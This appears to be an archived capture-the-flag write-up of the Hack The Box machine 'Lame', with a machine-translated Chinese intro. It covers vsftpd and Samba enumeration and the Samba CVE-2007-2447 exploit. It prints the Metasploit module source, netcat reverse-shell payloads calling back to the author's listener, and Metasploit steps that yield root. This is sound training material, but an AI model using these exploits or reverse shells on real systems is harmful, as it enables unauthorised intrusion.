# 

ftp 和 smb 枚举

# 0xdf黑客的东西





[0xdf.gitlab.io](https://0xdf.gitlab.io/2020/04/07/htb-lame.html)0xdf黑客的东西

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Flame-cover.png) 

跛脚是HTB上发布的第一个盒子（据我所知），那是在我开始玩之前。这是一个超级简单的盒子，很容易被元谱脚本直接撞倒到根壳上。尽管如此，它还是有一些非常类似OSCP的方面，所以我将展示它，无论有没有Mestasploit，并分析漏洞利用。它确实用VSFTPd服务器抛出了一个头假货，这是一个易受攻击的版本，但盒子配置为不允许远程利用。我将深入探讨《超越根》中的 VSFTPd。

## 箱子信息

名字

[跛](https://www.hackthebox.eu/home/machines/profile/1) ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Ficons%2Fbox-lame.png) 

发行日期

14 3月 2017

停用日期

26 五月 2017

操作系统

操作系统 ![](https://image.cubox.pro/article/2022091809192232808/86382.jpg) 

基本点

简易 \[20\]

额定难度

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Flame-diff.png) 

雷达图

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Flame-radar.png) 

 ![](https://image.cubox.pro/article/2022091809192294225/76393.jpg) 

19天 00小时 55分钟 25秒。[![0x1Nj3cT0R](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F22)](https://www.hackthebox.eu/home/users/profile/22)

 ![](https://image.cubox.pro/article/2022091809192276507/23214.jpg) 

19天 00小时 54分钟 36秒。[![0x1Nj3cT0R](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F22)](https://www.hackthebox.eu/home/users/profile/22)

造物主

[![](https://image.cubox.pro/article/2022091814483344911/94821.jpg)](https://www.hackthebox.eu/home/users/profile/1)-

## 侦察

### n地图

从端口扫描开始，找到 5 个打开的端口：`nmap`

```root@kali# nmap -sT -p- --min-rate 10000 -oA scans/alltcp 10.10.10.3
    Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-28 07:16 EST
    Nmap scan report for 10.10.10.3
    Host is up (0.021s latency).
    Not shown: 65530 filtered ports
    PORT     STATE SERVICE
    21/tcp   open  ftp
    22/tcp   open  ssh
    139/tcp  open  netbios-ssn
    445/tcp  open  microsoft-ds
    3632/tcp open  distccd
    
    Nmap done: 1 IP address (1 host up) scanned in 13.39 seconds
    root@kali# nmap -sU -p- --min-rate 10000 -oA scans/alludp 10.10.10.3
    Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-28 07:17 EST
    Nmap scan report for 10.10.10.3
    Host is up (0.019s latency).
    Not shown: 65531 open|filtered ports
    PORT     STATE  SERVICE
    22/udp   closed ssh
    139/udp  closed netbios-ssn
    445/udp  closed microsoft-ds
    3632/udp closed distcc
    
    Nmap done: 1 IP address (1 host up) scanned in 13.51 seconds
    
    root@kali# nmap -p 21,22,139,445,3632 -sV -sC -oA scans/tcpscripts 10.10.10.3
    Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-28 07:19 EST
    Nmap scan report for 10.10.10.3
    Host is up (0.023s latency).
    
    PORT     STATE SERVICE     VERSION
    21/tcp   open  ftp         vsftpd 2.3.4
    |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
    | ftp-syst:
    |   STAT:
    | FTP server status:
    |      Connected to 10.10.14.24
    |      Logged in as ftp
    |      TYPE: ASCII
    |      No session bandwidth limit
    |      Session timeout in seconds is 300
    |      Control connection is plain text
    |      Data connections will be plain text
    |      vsFTPd 2.3.4 - secure, fast, stable
    |_End of status
    22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
    | ssh-hostkey:
    |   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
    |_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
    139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
    3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
    Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
    
    Host script results:
    |_clock-skew: mean: 4h39m11s, deviation: 0s, median: 4h39m11s
    | smb-os-discovery:
    |   OS: Unix (Samba 3.0.20-Debian)
    |   NetBIOS computer name:
    |   Workgroup: WORKGROUP\x00
    |_  System time: 2019-02-28T06:59:11-05:00
    |_smb2-time: Protocol negotiation failed (SMB2)
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 52.02 seconds
    
```

My [go-to link for Ubuntu packages](https://packages.ubuntu.com/search?keywords=openssh-server) doesn’t list this version of OpenSSH, which means this OS is really old. Some Googling reveals it’s likely [Ubuntu 8.04 Handy Heron](https://launchpad.net/ubuntu/+source/openssh/1:4.7p1-8ubuntu1).

### FTP - TCP 21

#### Anonymous Login

Since FTP allows anonymous logins, I figured I’d check it out, but the directory was empty.

#### Exploits

vsftpd 2.3.4 is a famously backdoored FTP server. But even without knowing that, it’s always worth checking , which will show there is an exploit for this version of vsftpd:`searchsploit`

   ```root@kali# searchsploit vsftpd 2.3.4
    ----------------------------------------------------------------- ----------------------------------------
     Exploit Title                                                   |  Path
                                                                     | (/usr/share/exploitdb/)
    ----------------------------------------------------------------- ----------------------------------------
    vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)           | exploits/unix/remote/17491.rb
    ----------------------------------------------------------------- ----------------------------------------
    Shellcodes: No Result
    
```
I’ll certainly want to give that a try.

### SMB - TCP 445

#### Anonymous Login

`smbmap` shows only one share I can access without credentials:

  ```root@kali# smbmap -H 10.10.10.3
    [+] Finding open SMB ports....
    [+] User SMB session establishd on 10.10.10.3...
    [+] IP: 10.10.10.3:445  Name: 10.10.10.3
            Disk                                                    Permissions
            ----                                                    -----------
            print$                                                  NO ACCESS
            tmp                                                     READ, WRITE
            opt                                                     NO ACCESS
            IPC$                                                    NO ACCESS
            ADMIN$                                                  NO ACCESS   
```
    

When I originally solve this box a little over a year ago, I didn’t have an issue connecting with , but in posting this now, errors out:`smbclient``smbclient`

  
```
  root@kali# smbclient -N //10.10.10.3/tmp
    protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
```

    

Turns out that my client is set up for security reasons not to connect to older SMB versions. I [added the following](https://www.wombacher.cc/accessing-smb-share-on-old-nas-failed-from-linux/) to my file, and then it works fine:`/etc/samba.smb.conf`

   
```
 [global]
    client min protocol=NT1
```

    

[r518](https://twitter.com/_r518) on Twitter pointed out that I could also add this as a command line option:

   
```
 root@kali# smbclient -N //10.10.10.3/tmp --option='client min protocol=NT1'
    Anonymous login successful
    Try "help" to get a list of possible commands.
    smb: \> 
```

    

I’ll log in, but there’s nothing interesting in it, as it seems mapped to :`/tmp`

  ```
  root@kali# smbclient -N //10.10.10.3/tmp
    Anonymous login successful
    Try "help" to get a list of possible commands.
    smb: \> dir
      .                                   D        0  Thu Feb 28 07:04:46 2019
      ..                                 DR        0  Sun May 20 15:36:12 2012
      orbit-makis                        DR        0  Thu Feb 28 06:25:32 2019
      .ICE-unix                          DH        0  Wed Feb 27 10:02:35 2019
      .X11-unix                          DH        0  Wed Feb 27 10:03:00 2019
      gconfd-makis                       DR        0  Thu Feb 28 06:25:32 2019
      .X0-lock                           HR       11  Wed Feb 27 10:03:00 2019
      5122.jsvc_up                        R        0  Wed Feb 27 10:03:38 2019
    
                    7282168 blocks of size 1024. 5677404 blocks available 
```
    

#### Exploits

I’ll check Samba in as well:`searchsploit`

   ```
 root@kali# searchsploit samba 3.0
    ------------------------------------------------------------------------------------- ----------------------------------------
     Exploit Title                                                                       |  Path
                                                                                         | (/usr/share/exploitdb/)
    ------------------------------------------------------------------------------------- ----------------------------------------
    Samba 3.0.10 (OSX) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                 | exploits/osx/remote/16875.rb
    Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                               | exploits/multiple/remote/10095.txt
    Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)     | exploits/unix/remote/16320.rb
    Samba 3.0.21 < 3.0.24 - LSA trans names Heap Overflow (Metasploit)                   | exploits/linux/remote/9950.rb
    Samba 3.0.24 (Linux) - 'lsa_io_trans_names' Heap Overflow (Metasploit)               | exploits/linux/remote/16859.rb
    Samba 3.0.24 (Solaris) - 'lsa_io_trans_names' Heap Overflow (Metasploit)             | exploits/solaris/remote/16329.rb
    Samba 3.0.27a - 'send_mailslot()' Remote Buffer Overflow                             | exploits/linux/dos/4732.c
    Samba 3.0.29 (Client) - 'receive_smb_raw()' Buffer Overflow (PoC)                    | exploits/multiple/dos/5712.pl
    Samba 3.0.4 - SWAT Authorisation Buffer Overflow                                     | exploits/linux/remote/364.pl
    Samba < 3.0.20 - Remote Heap Overflow                                                | exploits/linux/remote/7701.txt
    ------------------------------------------------------------------------------------- ----------------------------------------
    Shellcodes: No Result
    
```

I’ll search for just to allow for something that says like 3.0.19 < 3.0.21. The one that looks promising is:`3.0`

```

    Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)
    
```


This is CVE-2007-2447, often referred to as Samba usermap script.

## VSFTPD Exploit

### Without Metasploit

I wrote about this exploit in my [LaCasaDePapel writeup](https://0xdf.gitlab.io/2019/07/27/htb-lacasadepapel.html). It can be triggered by connecting to FTP and logging in with a username ending in . I’ll try it with :`:)``nc`


```
    root@kali# nc 10.10.10.3 21
    220 (vsFTPd 2.3.4)
    USER 0xdf:)
    331 Please specify the password.
    PASS 0xdf-not-a-password 
```

    

If it worked, I should be able to connect to a listener on Lame port 6200. But it doesn’t work.

  
```
  root@kali# nc 10.10.10.3 6200
    Ncat: TIMEOUT.
    

```

### With Metasploit

I understand this exploit enough to know that it will be no different in Metasploit, but I can demonstrate here. I’ll fire up , and search for it:`msfconsole`

  
```
  msf5 > search vsftpd
    
    Matching Modules
    ================
    
       Name                                  Disclosure Date  Rank       Check  Description
       ----                                  ---------------  ----       -----  -----------
       exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
    
```


I’ll use it, and set the target:

   
```
 msf5 > use exploit/unix/ftp/vsftpd_234_backdoor
    msf5 exploit(unix/ftp/vsftpd_234_backdoor) > options
    
    Module options (exploit/unix/ftp/vsftpd_234_backdoor):
    
       Name    Current Setting  Required  Description
       ----    ---------------  --------  -----------
       RHOSTS                   yes       The target address range or CIDR identifier
       RPORT   21               yes       The target port (TCP)
    
    
    Exploit target:
    
       Id  Name
       --  ----
       0   Automatic
    
    
    msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts 10.10.10.3
    rhosts => 10.10.10.3
    
```


Set the payload to and run:`cmd/unix/interact`

  
```
  msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set payload cmd/unix/interact 
    payload => cmd/unix/interact
    msf5 exploit(unix/ftp/vsftpd_234_backdoor) > options
    
    Module options (exploit/unix/ftp/vsftpd_234_backdoor):
    
       Name    Current Setting  Required  Description
       ----    ---------------  --------  -----------
       RHOSTS  10.10.10.3       yes       The target address range or CIDR identifier
       RPORT   21               yes       The target port (TCP)
    
    
    Payload options (cmd/unix/interact):
    
       Name  Current Setting  Required  Description
       ----  ---------------  --------  -----------
    
    
    Exploit target:
    
       Id  Name
       --  ----
       0   Automatic
    
    
    msf5 exploit(unix/ftp/vsftpd_234_backdoor) > run
    
    [*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
    [*] 10.10.10.3:21 - USER: 331 Please specify the password.
    [*] Exploit completed, but no session was created.
```

    

It still fails.

I’ll explore why this fails in Beyond Root.

## SAMBA Exploit

### Completely Manually

#### Script Analysis

To understand what’s going on, I’ll grab the source for the exploit:

    
```
root@kali# searchsploit -m exploits/unix/remote/16320.rb
      Exploit: Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)
          URL: https://www.exploit-db.com/exploits/16320
         Path: /usr/share/exploitdb/exploits/unix/remote/16320.rb
    File Type: Ruby script, ASCII text, with CRLF line terminators
    
    Copied to: /root/hackthebox/forwardslash-10.10.10.183/16320.rb
    
```


It’s pretty short:

```

    ##
    # $Id: usermap_script.rb 10040 2010-08-18 17:24:46Z jduck $
    ##
    
    ##
    # This file is part of the Metasploit Framework and may be subject to
    # redistribution and commercial restrictions. Please see the Metasploit
    # Framework web site for more information on licensing and terms of use.
    # http://metasploit.com/framework/
    ##
    
    require 'msf/core'
    
    class Metasploit3 < Msf::Exploit::Remote
            Rank = ExcellentRanking
    
            include Msf::Exploit::Remote::SMB
    
            # For our customized version of session_setup_ntlmv1
            CONST = Rex::Proto::SMB::Constants
            CRYPT = Rex::Proto::SMB::Crypt
    
            def initialize(info = {})
                    super(update_info(info,
                            'Name'           => 'Samba "username map script" Command Execution',
                            'Description'    => %q{
                                            This module exploits a command execution vulnerability in Samba
                                    versions 3.0.20 through 3.0.25rc3 when using the non-default
                                    "username map script" configuration option. By specifying a username
                                    containing shell meta characters, attackers can execute arbitrary
                                    commands.
    
                                    No authentication is needed to exploit this vulnerability since
                                    this option is used to map usernames prior to authentication!
                            },
                            'Author'         => [ 'jduck' ],
                            'License'        => MSF_LICENSE,
                            'Version'        => '$Revision: 10040 $',
                            'References'     =>
                                    [
                                            [ 'CVE', '2007-2447' ],
                                            [ 'OSVDB', '34700' ],
                                            [ 'BID', '23972' ],
                                            [ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534' ],
                                            [ 'URL', 'http://samba.org/samba/security/CVE-2007-2447.html' ]
                                    ],
                            'Platform'       => ['unix'],
                            'Arch'           => ARCH_CMD,
                            'Privileged'     => true, # root or nobody user
                            'Payload'        =>
                                    {
                                            'Space'    => 1024,
                                            'DisableNops' => true,
                                            'Compat'      =>
                                                    {
                                                            'PayloadType' => 'cmd',
                                                            # *_perl and *_ruby work if they are installed
                                                            # mileage may vary from system to system..
                                                    }
                                    },
                            'Targets'        =>
                                    [
                                            [ "Automatic", { } ]
                                    ],
                            'DefaultTarget'  => 0,
                            'DisclosureDate' => 'May 14 2007'))
    
                    register_options(
                            [
                                    Opt::RPORT(139)
                            ], self.class)
            end
    
    
            def exploit
    
                    connect
    
                    # lol?
                    username = "/=`nohup " + payload.encoded + "`"
                    begin
                            simple.client.negotiate(false)
                            simple.client.session_setup_ntlmv1(username, rand_text(16), datastore['SMBDomain'], false)
                    rescue ::Timeout::Error, XCEPT::LoginError
                            # nothing, it either worked or it didn't ;)
                    end
    
                    handler
            end
    
    end
    
```


The key part is in at the bottom. It is creating an SMB session using:`def exploit`

*   username = ```/=`nohup [payload]` ```
*   password = random 16 characters
*   domain = user provided domain

So basically on Linux, are used to execute and put the output in place, just like . It seems Samba is allowing that to happen inside the username. Metasploit is calling (which starts the process outside the current context) and then a payload.``` ` ` ````$()``nohup`

#### smbclient Fails


```
I’ll try this with . I’ll start a listener on 443. I can connect to the share using . First I tried specifying a user:`smbclient``nc``smbclient //10.10.10.3/tmp`

    root@kali# smbclient //10.10.10.3/tmp -U "./=`nohup nc -e /bin/sh 10.10.14.24 443`"
    nohup: ignoring input and redirecting stderr to stdout
    

At my listener, I get a connection:

    root@kali# nc -lnvp 443
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.14.24.
    Ncat: Connection from 10.10.14.24:48532.
    

Unfortunately, it’s from my local box. My is executing the before sending the connection. I’ll swap the for :`bash```` ` ` ````"``'`

    root@kali# smbclient //10.10.10.3/tmp -U './=`nohup nc -e /bin/sh 10.10.14.24 443`'
    Enter =`NOHUP NC -E \bin/sh 10.10.14.24 443`'s password:
    

For some reason, the start of the command is getting capitalized, which is going to break execution.
```


#### smbclient success

It turns out there’s another way to login over , and that’s used for changing users once connected with the command (I just hit enter when prompted for a password):
```
`smbclient``logon`

    smb: \> logon "./=`nohup nc -e /bin/sh 10.10.14.24 443`"
    Password: 
    session setup failed: NT_STATUS_IO_TIMEOUT
    
```


I get a connection from Lame with a root shell:

   
```
 root@kali# nc -lnvp 443
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.3.
    Ncat: Connection from 10.10.10.3:55410.
    id
    uid=0(root) gid=0(root)
```

    

### Python Script

Some Googling led me to [this GitHub](https://github.com/amriunix/CVE-2007-2447) with a Python POC for the exploit. I can get a shell easily, by following the “install” instructions and then running the script:

 
```
   root@kali# python usermap_script.py 10.10.10.3 139 10.10.14.24 443
    [*] CVE-2007-2447 - Samba usermap script
    [+] Connecting !
    [+] Payload was sent - check netcat !
```

    

Sure enough, I get a shell from Lame:

    root@kali# nc -lnvp 443
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.3.
    Ncat: Connection from 10.10.10.3:44666.
    id
    uid=0(root) gid=0(root)
    

### With Metasploit

I can also do this with Metasploit.

    msf5 > use exploit/multi/samba/usermap_script
    msf5 exploit(multi/samba/usermap_script) > set rhosts 10.10.10.3
    rhosts => 10.10.10.3
    msf5 exploit(multi/samba/usermap_script) > set payload cmd/unix/reverse
    payload => cmd/unix/reverse
    msf5 exploit(multi/samba/usermap_script) > set lhost tun0
    lhost => 10.10.14.24
    msf5 exploit(multi/samba/usermap_script) > set lport 443
    lport => 443
    

Now I can check out the options and make sure everything looks right:

 
```
   msf5 exploit(multi/samba/usermap_script) > options
    
    Module options (exploit/multi/samba/usermap_script):
    
       Name    Current Setting  Required  Description
       ----    ---------------  --------  -----------
       RHOSTS  10.10.10.3       yes       The target address range or CIDR identifier
       RPORT   139              yes       The target port (TCP)
    
    
    Payload options (cmd/unix/reverse):
    
       Name   Current Setting  Required  Description
       ----   ---------------  --------  -----------
       LHOST  10.10.14.24      yes       The listen address (an interface may be specified)
       LPORT  443              yes       The listen port
    
    
    Exploit target:
    
       Id  Name
       --  ----
       0   Automatic
```

    

When I run this, it shows me that shell session opened, and then just sits at an empty line. But if I type commands into that line, I get results:

  
```
  msf5 exploit(multi/samba/usermap_script) > run
    
    [*] Started reverse TCP double handler on 10.10.14.24:443 
    [*] Accepted the first client connection...
    [*] Accepted the second client connection...
    [*] Command: echo zchdJVWjFG8sP3T3;
    [*] Writing to socket A
    [*] Writing to socket B
    [*] Reading from sockets...
    [*] Reading from socket B
    [*] B: "zchdJVWjFG8sP3T3\r\n"
    [*] Matching...
    [*] A is input...
    [*] Command shell session 1 opened (10.10.14.24:443 -> 10.10.10.3:37959) at 2019-02-28 08:52:31 -0500
    
    id
    uid=0(root) gid=0(root)
```

    

### Shell as Root

With a shell via any of these methods, I can use and to get a nicer shell:`python``pty`

   
```
 python -c 'import pty; pty.spawn("bash")'
    root@lame:/#
```

    

And then get the flags:


```
    root@lame:/home# find . -name user.txt -exec cat {} \;
    69454a93************************
    
    root@lame:/root# cat root.txt
    92caac3b************************
    
```


## Beyond Root - VSFTPd

So what happened with the VSFTPd? When I first scanned the box with , it showed four open TCP ports: FTP (21), SSH (22), Samba (139, 445), and something on 3632. But with a shell, I could see far more listeners:`nmap`

    root@lame:/# netstat -tnlp
    Active Internet connections (only servers)                                                           
    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name     
    tcp        0      0 0.0.0.0:512             0.0.0.0:*               LISTEN      5038/xinetd          
    tcp        0      0 0.0.0.0:513             0.0.0.0:*               LISTEN      5038/xinetd          
    tcp        0      0 0.0.0.0:2049            0.0.0.0:*               LISTEN      -                    
    tcp        0      0 0.0.0.0:514             0.0.0.0:*               LISTEN      5038/xinetd          
    tcp        0      0 0.0.0.0:48836           0.0.0.0:*               LISTEN      5185/rmiregistry     
    tcp        0      0 0.0.0.0:8009            0.0.0.0:*               LISTEN      5144/jsvc            
    tcp        0      0 0.0.0.0:6697            0.0.0.0:*               LISTEN      5194/unrealircd      
    tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      4759/mysqld          
    tcp        0      0 0.0.0.0:1099            0.0.0.0:*               LISTEN      5185/rmiregistry     
    tcp        0      0 0.0.0.0:6667            0.0.0.0:*               LISTEN      5194/unrealircd      
    tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      5013/smbd            
    tcp        0      0 0.0.0.0:5900            0.0.0.0:*               LISTEN      5208/Xtightvnc       
    tcp        0      0 0.0.0.0:41292           0.0.0.0:*               LISTEN      4935/rpc.mountd      
    tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      4217/portmap         
    tcp        0      0 0.0.0.0:6000            0.0.0.0:*               LISTEN      5208/Xtightvnc       
    tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      5164/apache2         
    tcp        0      0 0.0.0.0:55312           0.0.0.0:*               LISTEN      -                    
    tcp        0      0 0.0.0.0:8787            0.0.0.0:*               LISTEN      5190/ruby            
    tcp        0      0 0.0.0.0:8180            0.0.0.0:*               LISTEN      5144/jsvc            
    tcp        0      0 0.0.0.0:1524            0.0.0.0:*               LISTEN      5038/xinetd          
    tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      5038/xinetd          
    tcp        0      0 10.10.10.3:53           0.0.0.0:*               LISTEN      4612/named           
    tcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN      4612/named           
    tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      5038/xinetd          
    tcp        0      0 0.0.0.0:60855           0.0.0.0:*               LISTEN      4235/rpc.statd       
    tcp        0      0 0.0.0.0:5432            0.0.0.0:*               LISTEN      4840/postgres   
    tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN      5003/master     
    tcp        0      0 127.0.0.1:953           0.0.0.0:*               LISTEN      4612/named      
    tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      5013/smbd       
    tcp6       0      0 :::2121                 :::*                    LISTEN      5082/proftpd: (acce
    tcp6       0      0 :::3632                 :::*                    LISTEN      4867/distccd    
    tcp6       0      0 :::53                   :::*                    LISTEN      4612/named      
    tcp6       0      0 :::22                   :::*                    LISTEN      4636/sshd       
    tcp6       0      0 :::5432                 :::*                    LISTEN      4840/postgres   
    tcp6       0      0 ::1:953                 :::*                    LISTEN      4612/named       
    

The firewall must be blocking a lot.

That means that if the backdoor is triggered, and starts listening on 6200, it’s likely not reachable from my host. I’ll test. For demonstration purposes, I’ll switch to the user on the box, makis:

    root@lame:/etc# su - makis -c bash
    makis@lame:~$ nc 127.0.0.1 6200
    (UNKNOWN) [127.0.0.1] 6200 (?) : Connection refused
    

I’m unable to connect to the backdoor. When I trigger the backdoor again, now I can connect and get a shell as root:

    makis@lame:~$ nc 127.0.0.1 6200
    id
    uid=0(root) gid=0(root)
    

I can see the port is now listening:

    root@lame:/etc# netstat -tnlp | grep 6200
    tcp        0      0 0.0.0.0:6200            0.0.0.0:*               LISTEN      5580/vsftpd  
    

[Lame distcc + Privesc »](https://0xdf.gitlab.io/2020/04/08/htb-lame-more.html)

[查看原网页: 0xdf.gitlab.io](https://0xdf.gitlab.io/2020/04/07/htb-lame.html)